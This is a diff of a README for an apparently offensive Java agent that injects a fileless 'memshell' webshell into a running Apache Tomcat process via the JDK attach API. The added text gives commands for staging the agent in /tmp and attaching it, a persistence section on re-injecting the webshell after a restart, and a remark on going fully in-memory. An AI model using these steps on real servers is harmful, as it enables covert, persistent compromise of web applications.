@@ -20,22 +20,40 @@ Server version: Apache Tomcat/11.0.11
 ```
 
 ## How to Use
-Prepare the attach helper
+Prepare the attach helper and agent.jar
 ```bash
 $ javac Attach.java
-```
-
-Package the agent.jar
-```bash
 $ mvn clean package -DskipTests
 ```
+```bash
+$ mv Attach.class /tmp/Attach.class
+$ mv ./target/agent.jar /tmp/agent.jar
+```
+
+> [!Important]
+>
+> Confirm the tomcat service has setup, send a request to load target class
 
 Attach agent.jar to tomcat 
 ```bash
-$ java --add-modules jdk.attach Attach "$(jcmd | grep -E 'catalina' | awk '{print $1}')" <Path-to-Project>/target/agent.jar
+$ bash -lc "cd /tmp && java --add-modules jdk.attach Attach $(jcmd | grep -E 'catalina' | awk '{print $1}') /tmp/agent.jar"
 ```
 
+## Persistence
+The agent implements simple persistence feature in `AgentEntry.persist()`
+1. shutdown the injected tomcat service and restart a new one immediately
+2. access the new tomcat service once (`curl localhost:8080`)
+3. wait a few seconds, the memshell will be injected again
+
+> [!Note]
+> 
+> Current implementation still relies on storing agent.jar & Attach helper in filesystem. A proper implementation requires loading those files into memory
+
 ## Note
-run `curl localhost:8080` once before attach the agent, otherwise the ApplicationFilterChain class may not be loaded
+Must access tomcat (run `curl localhost:8080`) once before attach the agent, otherwise the ApplicationFilterChain class may not be loaded
 
 make sure there's no other tomcat running on your testing environment :)
+
+
+## References
+[利用“进程注入”实现无文件复活 WebShell](https://www.freebuf.com/articles/web/172753.html)
